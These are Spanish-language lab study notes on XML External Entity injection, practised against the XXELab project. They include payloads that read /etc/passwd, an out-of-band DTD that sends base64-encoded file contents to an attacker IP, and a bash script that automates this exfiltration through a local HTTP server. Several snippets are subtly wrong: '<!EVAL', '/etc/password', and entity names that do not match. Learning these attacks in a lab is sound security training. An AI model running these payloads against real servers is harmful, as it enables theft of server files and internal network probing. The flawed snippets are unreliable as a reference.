Cuando hablamos de **XML External Entity** (**XXE**) **Injection**, a lo que nos referimos es a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como aplicaciones web o servicios web.

Un ataque XXE generalmente implica la inyección de una **entidad** XML maliciosa en una solicitud HTTP, que es procesada por el servidor y puede resultar en la exposición de información sensible. Por ejemplo, un atacante podría inyectar una entidad XML que hace referencia a un archivo en el sistema del servidor y obtener información confidencial de ese archivo.

Un caso común en el que los atacantes pueden explotar XXE es cuando el servidor web no valida adecuadamente la entrada de datos XML que recibe. En este caso, un atacante puede inyectar una entidad XML maliciosa que contiene referencias a archivos del sistema que el servidor tiene acceso. Esto puede permitir que el atacante obtenga información sensible del sistema, como contraseñas, nombres de usuario, claves de API, entre otros datos confidenciales.

Cabe destacar que, en ocasiones, los ataques XML External Entity (XXE) Injection no siempre resultan en la exposición directa de información sensible en la respuesta del servidor. En algunos casos, el atacante debe “**ir a ciegas**” para obtener información confidencial a través de técnicas adicionales.

Una forma común de “ir a ciegas” en un ataque XXE es enviar peticiones especialmente diseñadas desde el servidor para conectarse a un **Document Type Definition** (**DTD**) definido externamente. El DTD se utiliza para validar la estructura de un archivo XML y puede contener referencias a recursos externos, como archivos en el sistema del servidor.

Este enfoque de “ir a ciegas” en un ataque XXE puede ser más lento y requiere más trabajo que una explotación directa de la vulnerabilidad. Sin embargo, puede ser efectivo en casos donde el atacante tiene una idea general de los recursos disponibles en el sistema y desea obtener información específica sin ser detectado.

Adicionalmente, en algunos casos, un ataque XXE puede ser utilizado como un vector de ataque para explotar una vulnerabilidad de tipo **SSRF** (**Server-Side Request Forgery**). Esta técnica de ataque puede permitir a un atacante escanear **puertos internos** en una máquina que, normalmente, están protegidos por un firewall externo.

Un ataque SSRF implica enviar solicitudes HTTP desde el servidor hacia direcciones IP o puertos internos de la red de la víctima. El ataque XXE se puede utilizar para desencadenar un SSRF al inyectar una entidad XML maliciosa que contiene una referencia a una dirección IP o puerto interno en la red del servidor.

Al explotar con éxito un SSRF, el atacante puede enviar solicitudes HTTP a servicios internos que de otra manera no estarían disponibles para la red externa. Esto puede permitir al atacante obtener **información sensible** o incluso **tomar el control** de los servicios internos.

A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando en esta clase para practicar esta vulnerabilidad:

- **XXELab**: [https://github.com/jbarone/xxelab](https://github.com/jbarone/xxelab)

El xxe consiste en injectar nuestro codigo a  codigo XML de las peticiones

![](../../../attachments/Pasted%20image%2020260118140144.png)

![](../../../attachments/Pasted%20image%2020260118140223.png)

Ejemplo practico desde una petición interceptada con burpsuit donde vemos que se envian datos XML y en la respuesta se muestra alguno de ellos haciendo referencia a alguno de los campos enviados podremos introducir una entidad con nuestro código. 

Ej
![](../../../attachments/Pasted%20image%2020260118140457.png)

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<root> 
	<name>
		test
	</name> 
	<tel>
		123456789
	</tel> 
	<email>
		prueba
	</email> 
	<password>
		s4vitar123
	</password> 
</root>
```

Aqui insertaremos nuestra entidad para ver si nos devuelve lo insertado en ella

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [<!ENTITY myName "Adrian">]>
<root> 
	<name>
		test
	</name> 
	<tel>
		123456789
	</tel> 
	<email>
		&myName;
	</email> 
	<password>
		s4vitar123
	</password> 
</root>
```

![](../../../attachments/Pasted%20image%2020260118141503.png)

Intentamos acceder a ficheros dentro de la maquina explotando esta vulnerabilidad

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [<!ENTITY myfile SYSTEM "file:///etc/password">]>
#Otra opcion es 
<!DOCTYPE foo [<!ENTITY myfile SYSTEM "php://filter/convert.base64-encode/resources=/etc/password">]>
#Nos da la respuesta en base64 y hay que decodificarla
<root> 
	<name>
		test
	</name> 
	<tel>
		123456789
	</tel> 
	<email>
		&myFile;
	</email> 
	<password>
		s4vitar123
	</password> 
</root>
```

![](../../../attachments/Pasted%20image%2020260118142200.png)


XXE Out of Band Interaction son aquellas que nos nos devuelven nada en la respuesta similar a las sql blind injection, la web no siempre deja declarar entidades por lo que se actúa enviando una petición a un servidor previamente creado con el código malicioso 

![](../../../attachments/Pasted%20image%2020260118142558.png)

Si no permite declarar la entidad en la estructura pues la llamamos desde el mismo DOCTYPE

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ip/port/recursoXML"> %xxe;]>
<root> 
	<name>
		test
	</name> 
	<tel>
		123456789
	</tel> 
	<email>
		test@test.com
	</email> 
	<password>
		s4vitar123
	</password> 
</root>
```

Nos creamos un archivo .dtd donde le ponemos el codigo malicioso malicius.dtd

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/password">
<!EVAL % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ipAtacante/?file=%file;'>">
%eval
%exfil

#Leyenda
&#x25 Valor de % en HEX 

Lo que hace esto basicamente es hacer que la maquina objetivo haga una peticion al servidor nuestro y mendiante la entidad file extraer el contenido de passwd en base 64 y luego realizar otra peticion enviando los datos a nuestro servidor
```

Nos montamos un servidor con python donde este el fichero malicius.dtd y realizamos la peticion desde burpsuit

Scrip de python para automatizar el fichero que queremos leer

```bash
#!/bin/bash

echo -ne "\n[+] Introduce el archivo a leer: " && read -r myFilename

malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.111.45/?file=%file;'>\">
%eval;
%exfil;"""

echo "$malicious_dtd" > malicious.dtd

python3 -m http.server 80 &>response &

PID=$!

	sleep 1; echo

curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.111.45/malicious.dtd"> %xxe;]>
<root><name>test</name><tel>123456789</tel><email>test@test.com</email><password>s4vitar123</password></root>' &>/dev/null

cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d
kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null
```

Exprecion regular para obtener la cadena en base 64 de la respuesta en el archivo response que se genera el  *python3 -m http.server 80 &>response &*

```bash
cat response | grep -oP "/?file=\K[^.*\s]+"
```